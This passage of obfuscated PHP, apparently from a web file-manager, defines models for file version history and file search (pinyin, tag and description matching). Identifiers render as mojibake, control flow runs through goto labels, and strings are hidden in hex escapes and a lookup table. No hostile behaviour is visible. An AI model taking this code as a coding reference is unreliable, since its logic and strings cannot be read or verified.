&& isset($DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[405]][$CÑ†ÓË“ÄÍ[1006]])) { $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[405]][$CÑ†ÓË“ÄÍ[1006]] = $bÜ¢Äöï‰×[$DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[405]][$CÑ†ÓË“ÄÍ[1006]]]; $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[405]][$CÑ†ÓË“ÄÍ[1007]] = $bÜ¢Äöï‰×[$DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[405]][$CÑ†ÓË“ÄÍ[1007]]]; } if ($DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[29]] == $CÑ†ÓË“ÄÍ[2290] && isset($DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[405]][$CÑ†ÓË“ÄÍ[369]])) { $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[405]][$CÑ†ÓË“ÄÍ[369]] = $bÜ¢Äöï‰×[$DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[405]][$CÑ†ÓË“ÄÍ[369]]]; } $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[391]] = $bÜ¢Äöï‰×[$DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[369]]]; $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[2295]] = $bÜ¢Äöï‰×[$DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[2282]]]; if ($DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[29]] == $CÑ†ÓË“ÄÍ[2068]) { $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[2295]] = $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[391]]; $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[2282]] = $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[2295]][$CÑ†ÓË“ÄÍ[369]]; $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[391]] = !1; $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[369]] = $CÑ†ÓË“ÄÍ[33]; } $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[2238]] = $E¦ğ÷‡‡á[$DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[1434]]]; } $B‰Ó¦—¿„«[$CÑ†ÓË“ÄÍ[354]] = $EÌ¶ê¦¯ô; goto C—Ú´±ÇºÓ; Aª”Ò åŞÍ: $A¶é½Â¼¦à = array_unique($A¶é½Â¼¦à); $A“øÊøç¶¦ = array_unique(array_to_keyvalue($EÌ¶ê¦¯ô, $CÑ†ÓË“ÄÍ[33], $CÑ†ÓË“ÄÍ[1434])); $E¦ğ÷‡‡á = Model($CÑ†ÓË“ÄÍ[477])->userListInfo($A“øÊøç¶¦); goto c½†ƒññÊ; F¥ØÃÜ·‰ø: $CÑ†ÓË“ÄÍ =& $_SERVER[Æ]; $EÌ¶ê¦¯ô = $B‰Ó¦—¿„«[$CÑ†ÓË“ÄÍ[354]]; $A¶é½Â¼¦à = array_to_keyvalue($EÌ¶ê¦¯ô, $CÑ†ÓË“ÄÍ[33], $CÑ†ÓË“ÄÍ[369]); goto b‚çÒëÅ‡ˆ; FÌÆÅ’ÚäÜ: } public function removeBySource($D»‘¬Ø¬ÑÅ) { $cìõƒÃÍï = array($_SERVER[Æ][383] => $D»‘¬Ø¬ÑÅ); $this->where($cìõƒÃÍï)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\162\x63\x65\137\150\x69\163\164\x6f\162\x79"; public function addHistory($F‹ô•ÎáË®, $B© æ½ã×Ä = '') { $FÄÛâÖº½ =& $_SERVER[Æ]; $f†Ü£Š¦ä = array($FÄÛâÖº½[383] => $F‹ô•ÎáË®[$FÄÛâÖº½[369]], $FÄÛâÖº½[1425] => isset($F‹ô•ÎáË®[$FÄÛâÖº½[379]]) ? $F‹ô•ÎáË®[$FÄÛâÖº½[379]] : $F‹ô•ÎáË®[$FÄÛâÖº½[378]], $FÄÛâÖº½[420] => $F‹ô•ÎáË®[$FÄÛâÖº½[419]], $FÄÛâÖº½[520] => $F‹ô•ÎáË®[$FÄÛâÖº½[77]], $FÄÛâÖº½[2296] => $B© æ½ã×Ä); $dÄÊà«Æ×½ = $GLOBALS[$FÄÛâÖº½[6]][$FÄÛâÖº½[84]][$FÄÛâÖº½[2297]]; if ($dÄÊà«Æ×½ > 1) { $this->historyAutoClear($f†Ü£Š¦ä[$FÄÛâÖº½[369]]); $this->add($f†Ü£Š¦ä); } Model($FÄÛâÖº½[2298])->eventFileEdit($F‹ô•ÎáË®[$FÄÛâÖº½[369]]); } private function historyAutoClear($E‚ÎÊ„½×±) { goto B‡ÌáÎ“Ç; cÊœš×¿™º: if ($fœÖ‘ù˜Ôæ >= 500) { return; } $Bå‚½åó = array($A‹Âïëùª[383] => $E‚ÎÊ„½×±); $Bˆ¤á¹ÜÆµ = $this->field($A‹Âïëùª[2301])->where($Bå‚½åó)->order($A‹Âïëùª[2293])->select(); goto BŠÏªË¤ä¬; BŠÏªË¤ä¬: if (!$Bˆ¤á¹ÜÆµ || $fœÖ‘ù˜Ôæ >= count($Bˆ¤á¹ÜÆµ)) { return; } $e•®Ì Ğø˜ = array_to_keyvalue($Bˆ¤á¹ÜÆµ, $A‹Âïëùª[33], $A‹Âïëùª[367]); $e•®Ì Ğø˜ = array_slice($e•®Ì Ğø˜, $fœÖ‘ù˜Ôæ); goto E”ºİ…óà; B‡ÌáÎ“Ç: $A‹Âïëùª =& $_SERVER[Æ]; $b°á¡ƒõ¡Ğ = Model($A‹Âïëùª[1088])->get($A‹Âïëùª[2299]); $D„±Î°·ô = $GLOBALS[$A‹Âïëùª[6]][$A‹Âïëùª[84]][$A‹Âïëùª[2297]]; goto F¤Ç…ğªˆ–; F¤Ç…ğªˆ–: $dÇ·„ºøØ¹ = $b°á¡ƒõ¡Ğ == $A‹Âïëùª[2300] ? 3 : $D„±Î°·ô; if ($D„±Î°·ô <= 1) { $dÇ·„ºøØ¹ = 1; } $fœÖ‘ù˜Ôæ = $dÇ·„ºøØ¹ - 1; goto cÊœš×¿™º; E”ºİ…óà: $FÀ›òÚ¤®® = array_to_keyvalue($Bˆ¤á¹ÜÆµ, $A‹Âïëùª[33], $A‹Âïëùª[419]); $FÀ›òÚ¤®® = array_slice($FÀ›òÚ¤®®, $fœÖ‘ù˜Ôæ); if (!$e•®Ì Ğø˜ || !$FÀ›òÚ¤®®) { return; } goto D¶äƒ«ˆ…¯; D¶äƒ«ˆ…¯: $Bå‚½åó = array($A‹Âïëùª[385] => array($A‹Âïëùª[7], $e•®Ì Ğø˜)); $this->where($Bå‚½åó)->delete(); Model($A‹Âïëùª[422])->remove($FÀ›òÚ¤®®); goto b¬¢Í‰‹Ê§; b¬¢Í‰‹Ê§: } public function listData($C±Üğ‡òÆ) { goto FÍŞõ¾àòğ; cœ›ìÜØÊ: $e™Œ¾ñØÂ¨ = 3; if ($B†«Å·± == $AØÓò†“–¦[2300]) { $aÓİ„É ç‚[$AØÓò†“–¦[354]] = array_slice($aÓİ„É ç‚[$AØÓò†“–¦[354]], 0, $e™Œ¾ñØÂ¨); $aÓİ„É ç‚[$AØÓò†“–¦[351]] = array($AØÓò†“–¦[2303] => 1, $AØÓò†“–¦[2304] => 20, $AØÓò†“–¦[2305] => 1, $AØÓò†“–¦[2306] => count($aÓİ„É ç‚[$AØÓò†“–¦[354]])); } return $aÓİ„É ç‚; goto E°¿ŞÆËå; BùåÍñˆÑ‹: $aÓİ„É ç‚ = $this->field($aÖ¼‹—êÂ)->where($B‹é‹Ş„é)->order($AØÓò†“–¦[2293])->selectPage(); $this->_listAppendUser($aÓİ„É ç‚[$AØÓò†“–¦[354]]); $B†«Å·± = Model($AØÓò†“–¦[1088])->get($AØÓò†“–¦[2299]); goto cœ›ìÜØÊ; FÍŞõ¾àòğ: $AØÓò†“–¦ =& $_SERVER[Æ]; $B‹é‹Ş„é = array($AØÓò†“–¦[383] => $C±Üğ‡òÆ); $aÖ¼‹—êÂ = $AØÓò†“–¦[2302]; goto BùåÍñˆÑ‹; E°¿ŞÆËå: } protected function _listAppendUser(&$CÉçïµ¿·) { $CÏÁ˜˜•„µ =& $_SERVER[Æ]; $d¼¬ëÈ‚‰´ = array_to_keyvalue($CÉçïµ¿·, $CÏÁ˜˜•„µ[33], $CÏÁ˜˜•„µ[1434]); $fïù´¢à§š = Model($CÏÁ˜˜•„µ[477])->userListInfo($d¼¬ëÈ‚‰´); foreach ($CÉçïµ¿· as &$f‰¯ù©˜óš) { $b»„¥„²Œ = $f‰¯ù©˜óš[$CÏÁ˜˜•„µ[1434]]; $f‰¯ù©˜óš[$CÏÁ˜˜•„µ[378]] = $fïù´¢à§š[$b»„¥„²Œ] ? $fïù´¢à§š[$b»„¥„²Œ] : !1; } } public function fileInfo($D§ĞƒŠ”¤) { $B‰œ†Šñ‰ê =& $_SERVER[Æ]; $c“¿«£ã©ğ = $this->tablePrefix; $fİ«¾¯›Ë = "{$c“¿«£ã©ğ}\x69\157\137\146\151\154\x65\x20\x66\x69\x6c\145\x73\40\157\156\x20\146\x69\154\145\163\x2e\146\151\154\145\x49\104\x20\x3d\x20\x68\151\163\x74\157\162\x79\x2e\146\x69\154\145\111\104"; return $this->alias($B‰œ†Šñ‰ê[2307])->where(array($B‰œ†Šñ‰ê[385] => $D§ĞƒŠ”¤))->join($fİ«¾¯›Ë, $B‰œ†Šñ‰ê[2308])->find(); } public function removeItem($a†¶¿Ã…ïÇ) { $CàÂùº’Õ¢ =& $_SERVER[Æ]; $B»Ş¥øÂ÷ë = array($CàÂùº’Õ¢[385] => $a†¶¿Ã…ïÇ); $FÏ™ğÓ‹éÔ = $this->where($B»Ş¥øÂ÷ë)->find(); if ($FÏ™ğÓ‹éÔ) { $DŞæñ¡Ìß = $this->where($B»Ş¥øÂ÷ë)->delete(); Model($CàÂùº’Õ¢[422])->remove($FÏ™ğÓ‹éÔ[$CàÂùº’Õ¢[419]]); return $DŞæñ¡Ìß; } return !1; } public function removeBySource($F‚¨¯¨–İ) { goto bö–ÃØ×©; Bãæ»å„ÅÖ: $Cà…åî«›¢ = array($B¹‚Ò¥©ÏÃ[383] => array($B¹‚Ò¥©ÏÃ[7], $F‚¨¯¨–İ)); $FŸ‹¦ö„èë = $this->field($B¹‚Ò¥©ÏÃ[420])->where($Cà…åî«›¢)->select(); if ($FŸ‹¦ö„èë) { $this->where($Cà…åî«›¢)->delete(); $aàÆÓ‘õ¬ñ = array_to_keyvalue($FŸ‹¦ö„èë, $B¹‚Ò¥©ÏÃ[33], $B¹‚Ò¥©ÏÃ[419]); Model($B¹‚Ò¥©ÏÃ[422])->remove($aàÆÓ‘õ¬ñ); } goto c—¿Ûî“¢´; bö–ÃØ×©: $B¹‚Ò¥©ÏÃ =& $_SERVER[Æ]; if (!$F‚¨¯¨–İ) { return !1; } if (!is_array($F‚¨¯¨–İ)) { $F‚¨¯¨–İ = array($F‚¨¯¨–İ); } goto Bãæ»å„ÅÖ; c—¿Ûî“¢´: return !0; goto FÙ˜Á½Œïª; FÙ˜Á½Œïª: } public function setDetail($A³ªÎÀ”Åæ, $c·Á¡İ¶ØÁ) { $fˆíÊ«òìñ =& $_SERVER[Æ]; return $this->where(array($fˆíÊ«òìñ[385] => $A³ªÎÀ”Åæ))->save(array($fˆíÊ«òìñ[2296] => $c·Á¡İ¶ØÁ)); } public function rollbackToItem($DùÕ²«Õô, $dŒ»Ù…ÏŒœ) { goto e˜òó³Áõ; A–ò³¹Åİ–: $E×ŠÜä¯¸¤ = $this->find($dŒ»Ù…ÏŒœ); $C²î¬«¥š‘ = array($E¸ÖŒÓ¿Ûœ[419] => $E×ŠÜä¯¸¤[$E¸ÖŒÓ¿Ûœ[419]], $E¸ÖŒÓ¿Ûœ[77] => $E×ŠÜä¯¸¤[$E¸ÖŒÓ¿Ûœ[77]], $E¸ÖŒÓ¿Ûœ[107] => time(), $E¸ÖŒÓ¿Ûœ[379] => USER_ID); Model($E¸ÖŒÓ¿Ûœ[751])->where(array($E¸ÖŒÓ¿Ûœ[369] => $DùÕ²«Õô))->save($C²î¬«¥š‘); goto D‡½«Û×ìì; e˜òó³Áõ: $E¸ÖŒÓ¿Ûœ =& $_SERVER[Æ]; $dîªÀ¼‚¬„ = Model($E¸ÖŒÓ¿Ûœ[751])->sourceInfo($DùÕ²«Õô); $this->addHistory($dîªÀ¼‚¬„); goto A–ò³¹Åİ–; D‡½«Û×ìì: return $this->where(array($E¸ÖŒÓ¿Ûœ[385] => $dŒ»Ù…ÏŒœ))->delete(); goto e¡‰ëÓ‚Úâ; e¡‰ëÓ‚Úâ: } public function clearSame($bøÓİŒŠƒ©) { goto D™¹ƒ‰Íè–; B·‘²Ó÷Š: $Dˆ‚„äŒ˜é = array(); $e”¢Æïã¨ = array(); foreach ($D¥½‘ì¾‰¾ as $eŒ˜´ŒÉ¿¼) { if (!$eŒ˜´ŒÉ¿¼ || count($eŒ˜´ŒÉ¿¼) <= 1) { continue; } foreach ($eŒ˜´ŒÉ¿¼ as $e…µƒÊø¹¬) { $Dˆ‚„äŒ˜é[] = $e…µƒÊø¹¬[$fÁğ÷Ü“Ÿ÷[419]]; $e”¢Æïã¨[] = $e…µƒÊø¹¬[$fÁğ÷Ü“Ÿ÷[367]]; } } goto B¾óÚÜù¦; B¾óÚÜù¦: if (!$e”¢Æïã¨) { return; } $this->where(array($fÁğ÷Ü“Ÿ÷[367] => array($fÁğ÷Ü“Ÿ÷[7], $e”¢Æïã¨)))->delete(); Model($fÁğ÷Ü“Ÿ÷[422])->remove($Dˆ‚„äŒ˜é); goto eØó–Ñ°…š; D™¹ƒ‰Íè–: $fÁğ÷Ü“Ÿ÷ =& $_SERVER[Æ]; $c™°åƒ“³‡ = $this->listData($bøÓİŒŠƒ©); $D¥½‘ì¾‰¾ = array_to_keyvalue_group($c™°åƒ“³‡, $fÁğ÷Ü“Ÿ÷[419]); goto B·‘²Ó÷Š; eØó–Ñ°…š: } public function userSpace() { $Fº¢Ùìâ“å =& $_SERVER[Æ]; $fØ¿³ãá¥é = $this->tablePrefix; $c‰ªÒ¿ğôó = array($Fº¢Ùìâ“å[1425] => USER_ID); $DÔ™´Ò±Šø = "{$fØ¿³ãá¥é}\151\x6f\137\x66\151\x6c\x65\40\146\151\x6c\x65\163\40\x6f\156\40\146\x69\154\145\163\56\146\151\154\x65\x49\104\40\75\x20\150\151\x73\x74\157\162\x79\56\146\x69\x6c\x65\x49\x44"; return $this->alias($Fº¢Ùìâ“å[2307])->where($c‰ªÒ¿ğôó)->join($DÔ™´Ò±Šø, $Fº¢Ùìâ“å[2308])->sum($Fº¢Ùìâ“å[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($FŸİ±Ñƒ„) { goto D¹ÈÈ³¬§Â; B¼•éÍÎ‰‰: if (!$aÎ„¸²ƒî) { return array(); } $CœĞ‘·âˆ = $aÎ„¸²ƒî[$d´Ì«–Ê½[160]]; $C‡¾ºè·‚ = $d´Ì«–Ê½[7]; goto B¸‹Ÿ«ØÔ; D¹ÈÈ³¬§Â: $d´Ì«–Ê½ =& $_SERVER[Æ]; $BÖÂ™–·ˆ¾ = KodIO::fileTypeList(); $aÎ„¸²ƒî = $BÖÂ™–·ˆ¾[$FŸİ±Ñƒ„]; goto B¼•éÍÎ‰‰; B¸‹Ÿ«ØÔ: if (!$aÎ„¸²ƒî[$d´Ì«–Ê½[160]]) { $A ù˜Õ¾® = array_to_keyvalue($BÖÂ™–·ˆ¾, $d´Ì«–Ê½[33], $d´Ì«–Ê½[160]); $CœĞ‘·âˆ = implode($d´Ì«–Ê½[47], $A ù˜Õ¾®); $C‡¾ºè·‚ = $d´Ì«–Ê½[2259]; } $F¬ô¸ÕÉá¯ = explode($d´Ì«–Ê½[47], trim($CœĞ‘·âˆ, $d´Ì«–Ê½[47])); return array($C‡¾ºè·‚, $F¬ô¸ÕÉá¯); goto AŸ²â ºã; AŸ²â ºã: } public function listPathType($Bİ‡Ê©®–™) { $E¾·†¤ìä =& $_SERVER[Æ]; $FğÉâŞÂÂğ = $this->fileTypeWhere($Bİ‡Ê©®–™); if (!$FğÉâŞÂÂğ) { return array(); } $d·ïóÖŠ×® = array($E¾·†¤ìä[521] => SourceModel::TYPE_USER, $E¾·†¤ìä[522] => USER_ID, $E¾·†¤ìä[518] => 0, $E¾·†¤ìä[519] => $FğÉâŞÂÂğ); return $this->listSource($d·ïóÖŠ×®); } public function listSearch($a–Ä‰ó‹Ÿù, $A‚è¡Ù÷ö = 300) { goto F³½ÄŸ¢îä; Aù¨³„ÜºŠ: $this->_listMake($Aåâ•œ†……); return $Aåâ•œ†……; goto Aï×ÌŸ®ŸĞ; DŠ¦‚…Õİ: $this->_listSearchBindPinyin($a–Ä‰ó‹Ÿù, $f«—‘¼º¿Ñ, $e›Ï¾È´éÏ); $this->alias($dŒÃİó½í[487])->_makeOrder()->cache(null, 10); $Aåâ•œ†…… = $this->distinct(!0)->field($e›Ï¾È´éÏ)->where($f«—‘¼º¿Ñ)->selectPage($A‚è¡Ù÷ö); goto DÉó˜¨ù¦º; F³½ÄŸ¢îä: $dŒÃİó½í =& $_SERVER[Æ]; if (isset($a–Ä‰ó‹Ÿù[$dŒÃİó½í[2177]]) && $a–Ä‰ó‹Ÿù[$dŒÃİó½í[2177]]) { $a–Ä‰ó‹Ÿù[$dŒÃİó½í[2177]] = str_replace($dŒÃİó½í[1590], $dŒÃİó½í[2309], trim($a–Ä‰ó‹Ÿù[$dŒÃİó½í[2177]])); } $f«—‘¼º¿Ñ = $this->_parseSearchWhere($a–Ä‰ó‹Ÿù); goto dù˜æ¢”ˆÑ; dù˜æ¢”ˆÑ: if (!isset($f«—‘¼º¿Ñ[$dŒÃİó½í[397]])) { $f«—‘¼º¿Ñ[$dŒÃİó½í[397]] = 0; } $e›Ï¾È´éÏ = $dŒÃİó½í[2310]; $fÀ“Á¹Ÿµ = $e›Ï¾È´éÏ; goto DŠ¦‚…Õİ; DÉó˜¨ù¦º: $this->_listSearchDesc($Aåâ•œ†……, $a–Ä‰ó‹Ÿù, $fÀ“Á¹Ÿµ); $this->_listSearchTag($Aåâ•œ†……, $a–Ä‰ó‹Ÿù, $fÀ“Á¹Ÿµ); $this->_listDataApply($Aåâ•œ†……[$dŒÃİó½í[354]]); goto Aù¨³„ÜºŠ; Aï×ÌŸ®ŸĞ: } private function _listSearchTag(&$dí¯ìõÏã, $dÌñğ‹™õƒ, $fñÃ…ñßÙì) { goto bŞ¤…²Õò¿; BÑÄ²¤‰«Ü: if (!$a¦ø·Şê°Ç) { return; } $B«À¢ë’‹ã = array($Cº’Øµ¢Ì[393] => array($Cº’Øµ¢Ì[7], $a¦ø·Şê°Ç)); $cö˜Ê¼Ø©Ğ = Model($Cº’Øµ¢Ì[394])->field($Cº’Øµ¢Ì[75])->where($B«À¢ë’‹ã)->select(); goto A«ˆğÔíè“; aƒ ™¼Ú¬ù: $a¦ø·Şê°Ç = array(); $CÚø‘¶¯§ = $dÌñğ‹™õƒ[$Cº’Øµ¢Ì[2177]]; foreach ($D¨¡èÜ as $aŒÏ•çÄ‘) { $f¢‚Å¦„Õ = $aŒÏ•çÄ‘[$Cº’Øµ¢Ì[28]]; $EçÀÀùèŒ­ = str_replace($Cº’Øµ¢Ì[50], $Cº’Øµ¢Ì[33], Pinyin::encode($f¢‚Å¦„Õ)); if (stripos($f¢‚Å¦„Õ, $CÚø‘¶¯§) !== !1 || stripos($EçÀÀùèŒ­, $CÚø‘¶¯§) !== !1) { $a¦ø·Şê°Ç[] = $aŒÏ•çÄ‘[$Cº’Øµ¢Ì[367]]; } } goto BÑÄ²¤‰«Ü; A«ˆğÔíè“: $cö˜Ê¼Ø©Ğ = array_to_keyvalue($cö˜Ê¼Ø©Ğ, $Cº’Øµ¢Ì[33], $Cº’Øµ¢Ì[75]); $CÃÇĞçÛá = array_unique($cö˜Ê¼Ø©Ğ); $this->_listSearchMerge($dí¯ìõÏã, $dÌñğ‹™õƒ, $fñÃ…ñßÙì, $CÃÇĞçÛá); goto bÆõô½ÀÏ; bŞ¤…²Õò¿: $Cº’Øµ¢Ì =& $_SERVER[Æ]; if (!$dÌñğ‹™õƒ[$Cº’Øµ¢Ì[2177]] || $dí¯ìõÏã[$Cº’Øµ¢Ì[351]][$Cº’Øµ¢Ì[340]] > 1) { return; } $D¨¡èÜ = Model($Cº’Øµ¢Ì[2311])->listData(); goto aƒ ™¼Ú¬ù; bÆõô½ÀÏ: } private function _listSearchDesc(&$A×˜İÚå, $CËì‡æÅ×ß, $FìÚ¯¨’ˆ) { goto bŒ”Èé™ØÇ; bŒ”Èé™ØÇ: $Cº¨ç÷Ãã =& $_SERVER[Æ]; if (!$CËì‡æÅ×ß[$Cº¨ç÷Ãã[2177]] || $A×˜İÚå[$Cº¨ç÷Ãã[351]][$Cº¨ç÷Ãã[340]] > 1) { return; } $Eƒ“„Ø¶ñ¸ = $this->listSearchChildren($CËì‡æÅ×ß[$Cº¨ç÷Ãã[461]]); goto DİÅÃ‹¡Ôá; F¸›ïˆõô: $DäéĞéò´ˆ = Model($Cº¨ç÷Ãã[504])->field($Cº¨ç÷Ãã[369])->where($c³¹à“ïÚ)->select(); $E‚ØäöØ˜” = array_to_keyvalue($DäéĞéò´ˆ, $Cº¨ç÷Ãã[33], $Cº¨ç÷Ãã[369]); $this->_listSearchMerge($A×˜İÚå, $CËì‡æÅ×ß, $FìÚ¯¨’ˆ, $E‚ØäöØ˜”); goto A¦»ƒ¹êî³; DİÅÃ‹¡Ôá: $Eƒ“„Ø¶ñ¸ = array_unique($Eƒ“„Ø¶ñ¸); if (!$Eƒ“„Ø¶ñ¸) { return; } $c³¹à“ïÚ = array($Cº¨ç÷Ãã[369] => array($Cº¨ç÷Ãã[7], $Eƒ“„Ø¶ñ¸), $Cº¨ç÷Ãã[89] => $Cº¨ç÷Ãã[405], $Cº¨ç÷Ãã[359] => array($Cº¨ç÷Ãã[750], $Cº¨ç÷Ãã[2179] . $CËì‡æÅ×ß[$Cº¨ç÷Ãã[2177]] . $Cº¨ç÷Ãã[2179])); goto F¸›ïˆõô; A¦»ƒ¹êî³: } private function _listSearchMerge(&$d÷ŞŞ‹ÖÈÓ, $D³íÕ…à ±, $eİ¢ÆÂºàÒ, $eƒŒ…ŠÔ„ä) { goto d½¡£§êŞ; FœÆî°Å å: $fÛë­êæß¡ = array_diff($eƒŒ…ŠÔ„ä, $céÀ¾ïË™¿); if (!$fÛë­êæß¡) { return; } $F§—…°í¹¬ = array($DŞ‡Ì¡ß»±[369] => array($DŞ‡Ì¡ß»±[7], $fÛë­êæß¡)); goto dœ™©­¡³‘; dœ™©­¡³‘: $dä«ë«× = $this->field($eİ¢ÆÂºàÒ)->where($F§—…°í¹¬)->select(); if (!$dä«ë«×) { return; } $Bñ‰Íºíƒ = array(); goto Eæ´øµÄÚ‚; d½¡£§êŞ: $DŞ‡Ì¡ß»± =& $_SERVER[Æ]; if (!$eƒŒ…ŠÔ„ä) { return; } $céÀ¾ïË™¿ = array_to_keyvalue($d÷ŞŞ‹ÖÈÓ[$DŞ‡Ì¡ß»±[354]], $DŞ‡Ì¡ß»±[33], $DŞ‡Ì¡ß»±[369]); goto FœÆî°Å å; Eæ´øµÄÚ‚: foreach ($dä«ë«× as $eìÅÈ÷ÅÍÅ) { $E¶¡´Ã’¶„ = $DŞ‡Ì¡ß»±[47] . $D³íÕ…à ±[$DŞ‡Ì¡ß»±[461]] . $DŞ‡Ì¡ß»±[47]; if (stripos($eìÅÈ÷ÅÍÅ[$DŞ‡Ì¡ß»±[459]], $E¶¡´Ã’¶„) !== !1) { $Bñ‰Íºíƒ[] = $eìÅÈ÷ÅÍÅ; } } $d÷ŞŞ‹ÖÈÓ[$DŞ‡Ì¡ß»±[354]] = array_merge($Bñ‰Íºíƒ, $d÷ŞŞ‹ÖÈÓ[$DŞ‡Ì¡ß»±[354]]); $d÷ŞŞ‹ÖÈÓ[$DŞ‡Ì¡ß»±[351]][$DŞ‡Ì¡ß»±[352]] += count($Bñ‰Íºíƒ); goto b¯ÍÏç—¸¢; b¯ÍÏç—¸¢: } public function listSearchChildren($EÙƒİ¼«“, $c°ëİæù‹Ç = 5000) { goto bƒôóíŒÈë; eÓø•ÃïÆÄ: $AöÒ•Á¨–ë = array($cÏ†Àâ‰„[459] => array($cÏ†Àâ‰„[750], $bÔïõÈ¬§¹[$cÏ†Àâ‰„[459]] . $bÔïõÈ¬§¹[$cÏ†Àâ‰„[369]] . $cÏ†Àâ‰„[484])); $Böá¯†Ìò = $this->field($cÏ†Àâ‰„[369])->cache(null, 600)->where($AöÒ•Á¨–ë)->count(); if ($Böá¯†Ìò > $c°ëİæù‹Ç) { return $this->_listSearchChildrenNear($EÙƒİ¼«“, $c°ëİæù‹Ç); } goto Bê‘Á£‰İÌ; Bê‘Á£‰İÌ: $AÈ¹ÏµÀ = $this->field($cÏ†Àâ‰„[369])->where($AöÒ•Á¨–ë)->select(); $F„¡Èç…ïÎ = array_to_keyvalue($AÈ¹ÏµÀ, $cÏ†Àâ‰„[33], $cÏ†Àâ‰„[369]); return $F„¡Èç…ïÎ; goto dÖ°Ò–ê“; bƒôóíŒÈë: $cÏ†Àâ‰„ =& $_SERVER[Æ]; $F„¡Èç…ïÎ = array(); $bÔïõÈ¬§¹ = $this->sourceInfo($EÙƒİ¼«“); goto eÓø•ÃïÆÄ; dÖ°Ò–ê“: } private function _listSearchChildrenNear($CÆ¡±”ÌÇ, $A»¼Çé¦Ş) { goto c×ª®Ş‹¼; c½¥‰¼¨¡ô: $C¢ÑÚ¥¹ó = $this->field($AÇíùÌ­ê†[2312])->where($Aá³ÍÚ†îæ)->select(); $F„‹“‹Í£… = array_to_keyvalue(array_filter_by_field($C¢ÑÚ¥¹ó, $AÇíùÌ­ê†[370], $AÇíùÌ­ê†[83]), $AÇíùÌ­ê†[33], $AÇíùÌ­ê†[369]); $c´ï”Ø™ = array_merge($c´ï”Ø™, array_to_keyvalue($C¢ÑÚ¥¹ó, $AÇíùÌ­ê†[33], $AÇíùÌ­ê†[369])); goto aÖ³¥‰¾…»; aÖ³¥‰¾…»: if (!$F„‹“‹Í£…) { return $c´ï”Ø™; } $Aá³ÍÚ†îæ = array($AÇíùÌ­ê†[461] => array($AÇíùÌ­ê†[7], $F„‹“‹Í£…)); $C¢ÑÚ¥¹ó = $this->field($AÇíùÌ­ê†[2312])->where($Aá³ÍÚ†îæ)->select(); goto bˆìèÛ¨ç”; bˆìèÛ¨ç”: $c´ï”Ø™ = array_merge($c´ï”Ø™, array_to_keyvalue($C¢ÑÚ¥¹ó, $AÇíùÌ­ê†[33], $AÇíùÌ­ê†[369])); $c´ï”Ø™ = array_slice($c´ï”Ø™, 0, $A»¼Çé¦Ş); return $c´ï”Ø™; goto d½§Èãöï—; c×ª®Ş‹¼: $AÇíùÌ­ê† =& $_SERVER[Æ]; $c´ï”Ø™ = array(); $Aá³ÍÚ†îæ = array($AÇíùÌ­ê†[461] => $CÆ¡±”ÌÇ); goto c½¥‰¼¨¡ô; d½§Èãöï—: } private function _listSearchBindPinyin($FÍ÷«’åÛÚ, &$cŒ´‘‘“Ãˆ, &$a¿‰Í¿¨›) { goto b¾™«„‰ƒµ; b¾™«„‰ƒµ: $ağÉƒ‘®²¼ =& $_SERVER[Æ]; if (!Input::check($FÍ÷«’åÛÚ[$ağÉƒ‘®²¼[2177]], $ağÉƒ‘®²¼[306]) || strlen($FÍ÷«’åÛÚ[$ağÉƒ‘®²¼[2177]]) < 2) { return; } $a›æÔá½½ø = "\114\x45\x46\124\x20\112\117\x49\116\x20{$this->tablePrefix}\151\x6f\137\163\x6f\x75\x72\143\145\137\x6d\145\x74\141\40\x6d\145\164\x61\40\x6f\x6e\x20\163\157\165\162\143\x65\x2e\x73\157\165\162\x63\x65\x49\104\x20\75\40\155\145\x74\x61\x2e\x73\157\x75\x72\143\x65\111\x44"; goto Eó‰ğ¬ é¡; Eí¬‡½ÍíŒ: $A‚š÷ÊâÇ[] = array($ağÉƒ‘®²¼[2316] => $e˜­²Ö˜¥å, $ağÉƒ‘®²¼[915] => $ağÉƒ‘®²¼[2181], array($ağÉƒ‘®²¼[2317] => $e˜­²Ö˜¥å, $ağÉƒ‘®²¼[2318] => array($ağÉƒ‘®²¼[7], array($ağÉƒ‘®²¼[416], $ağÉƒ‘®²¼[415])))); $this->join($a›æÔá½½ø); $cŒ´‘‘“Ãˆ = $A‚š÷ÊâÇ; goto C÷À­æ¡‹á; Eó‰ğ¬ é¡: $A‚š÷ÊâÇ = array(); $a¿‰Í¿¨› = str_replace(array($ağÉƒ‘®²¼[217], $ağÉƒ‘®²¼[50], $ağÉƒ‘®²¼[2313]), $ağÉƒ‘®²¼[33], $a¿‰Í¿¨›); $a¿‰Í¿¨› = $ağÉƒ‘®²¼[2314] . str_replace($ağÉƒ‘®²¼[47], $ağÉƒ‘®²¼[2315], $a¿‰Í¿¨›); goto eÖ†˜‰Ï…¤; eÖ†˜‰Ï…¤: unset($cŒ´‘‘“Ãˆ[$ağÉƒ‘®²¼[28]]); foreach ($cŒ´‘‘“Ãˆ as $eóâğ´ö“Ï => $Cí¶Ò­Ğ¬ ) { $A‚š÷ÊâÇ[$ağÉƒ‘®²¼[2314] . $eóâğ´ö“Ï] = $Cí¶Ò­Ğ¬ ; } $e˜­²Ö˜¥å = array($ağÉƒ‘®²¼[483], $ağÉƒ‘®²¼[2179] . 